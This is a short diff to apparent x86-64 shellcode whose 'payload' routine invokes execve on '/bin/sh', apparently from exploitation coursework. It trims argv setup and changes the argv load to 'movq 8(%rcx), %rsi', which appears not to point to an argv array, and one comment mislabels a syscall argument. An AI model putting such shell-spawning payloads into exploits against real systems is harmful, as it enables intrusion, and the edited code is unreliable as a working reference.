@@ -18,14 +18,9 @@ main:
 payload:
 
         movq    $file_to_run, %rcx
-        //movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */
-
-        xorq    %rax, %rax                 /* get a 64-bit zero value */
-        //movq    %rax, (ENVP)(%rcx)       /* set up null envp */
-
         movq    $SYS_execve, %rax        /* syscall arg 1: syscall number */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
-        movq    $argv, %rsi            /* syscall arg 2: argv */
+        movq    8(%rcx), %rsi            /* syscall arg 2: argv */
         movq    $0, %rdx                 /* syscall arg 3: envp */
         syscall                          /* invoke syscall */
 
@@ -35,7 +30,6 @@ payload:
 
 file_to_run:
         .ascii  "/bin/sh\0"
-argv:
         .quad   file_to_run
         .quad   0x0
         .quad   0x0
